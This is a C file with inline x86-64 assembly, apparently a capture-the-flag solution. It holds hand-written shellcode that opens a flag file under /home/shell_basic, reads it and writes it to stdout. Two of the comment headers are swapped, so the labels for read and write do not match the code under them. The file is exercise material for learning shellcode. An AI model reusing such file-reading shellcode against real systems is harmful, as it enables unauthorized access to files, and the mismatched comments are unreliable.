/*
 * Name: S4_06_shell_basic.c
 * $ gcc -o S4_06_shell_basic S4_06_shell_basic.c -masm=intel
 *
 * char buf[0x30];
 *
 * int fd = open("/tmp/flag", RD_ONLY, NULL);
 * read(fd, buf, 0x30); 
 * write(1, buf, 0x30);
 *
 * /home/shell_basic/flag_name_is_loooooong
 * 2F 68 6F 6D 65 2F 73 68 /home/sh
 * 65 6C 6C 5F 62 61 73 69 ell_basi
 * 63 2F 66 6C 61 67 5F 6E c/flag_n
 * 61 6D 65 5F 69 73 5F 6C ame_is_l
 * 6F 6F 6F 6F 6F 6F 6E 67 oooooong
 */

__asm__
(
	".global run_sh\n"
	"run_sh:\n"
	/**
	 * function: open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)
	 *
	 * param:
	 * @rax: 2
	 * @syscall: sys_open
	 * @rdi: const char *filename
	 * @rsi: int flags
	 * @rdx: int mode
	 */
	"push 0x0 # NULL\n"
	"mov rax, 0x676e6f6f6f6f6f6f # oooooong\n"
	"push rax\n"
	"mov rax, 0x6c5f73695f656d61 # ame_is_l\n"
	"push rax\n"
	"mov rax, 0x6e5f67616c662f63 # c/flag_n\n"
	"push rax\n"
	"mov rax, 0x697361625f6c6c65 # ell_basi\n"
	"push rax\n"
	"mov rax, 0x68732f656d6f682f # /home/sh\n"
	"push rax\n"
	"mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
	"xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
	"xor rdx, rdx    # rdx = 0\n"
	"mov rax, 2      # rax = 2 ; syscall_open\n"
	"syscall         # open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)\n"
	"\n"
	/**
	 * function: write(1, buf, 0x30);
	 *
	 * param:
	 * @rax: 1
	 * @syscall: sys_write
	 * @rdi: unsigned int fd
	 * @rsi: const char *buf
	 * @rdx: size_t count
	 */
	"mov rdi, rax      # rdi = fd\n"
	"mov rsi, rsp\n"
	"sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
	"mov rdx, 0x30     # rdx = 0x30     ; len\n"
	"mov rax, 0x0      # rax = 0        ; syscall_read\n"
	"syscall           # read(fd, buf, 0x30)\n"
	"\n"
	/**
	 * function: read(fd, buf, 0x30)
	 *
	 * param:
	 * @rax: 0
	 * @syscall: sys_read
	 * @rdi: unsigned int fd
	 * @rsi: char *buf
	 * @rdx: size_t count
	 */
	"mov rdi, 0x1      # rdi = 1 ; fd = stdout\n"
	"mov rax, 0x1      # rax = 1 ; syscall_write\n"
	"syscall           # write(fd, buf, 0x30)\n"
	"\n"

	/**
	 * function: exit(0)
	 *
	 * param:
	 * @rax: 0x3c (decimal: 60)
	 * @syscall: sys_exit
	 * @rdi: int error_code
	 */
	"xor rdi, rdi   # rdi = 0\n"
	"mov rax, 0x3c	# rax = sys_exit\n"
	"syscall        # exit(0)"
);

void run_sh();

int main(void)
{
	run_sh();
}